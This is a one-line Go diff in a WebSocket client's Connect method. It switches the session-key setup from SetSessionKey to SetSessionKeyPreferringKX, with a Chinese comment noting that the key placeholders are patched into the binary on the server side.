@@ -120,7 +120,7 @@ func (c *WSClient) Connect(url string) error {
 
 	// 会话密钥（占位符由服务端二进制 patch 替换）
 	salt, masterKey := app.GetListenerKeyConfig(listenerType)
-	if err := encrypt.GlobalClientKeyManager.SetSessionKey(salt[:16], masterKey[:32]); err != nil {
+	if err := encrypt.GlobalClientKeyManager.SetSessionKeyPreferringKX(salt[:16], masterKey[:32]); err != nil {
 		c.fail()
 		return err
 	}
